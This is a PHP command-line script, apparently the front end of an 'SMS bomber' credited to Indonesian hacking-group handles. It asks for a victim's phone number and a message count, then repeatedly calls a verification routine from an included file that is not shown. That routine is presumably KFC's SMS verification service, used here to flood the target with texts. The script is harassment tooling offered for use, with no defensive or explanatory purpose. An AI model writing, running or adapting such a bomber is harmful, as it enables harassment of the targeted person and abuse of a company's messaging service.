<?php
include 'bomkfc.php';

/*
    https://github.com/nee48/BomSmsKFC
    Made by Handika Pratama
    Modified by まやちゃん
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo " ############################################################ 
            [ Spammer SMS From KFC ] 
     Coded By  : KingCyberTron
     Contact Me: babycybermafia@gmail.com 
     Date      : 30/10/2017 
     Thanks to : BabyCyberMafia 
     Usage     : php kfc.php ############################################################\nInput : ";

echo "Nomor Target (tanpa 0/62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}

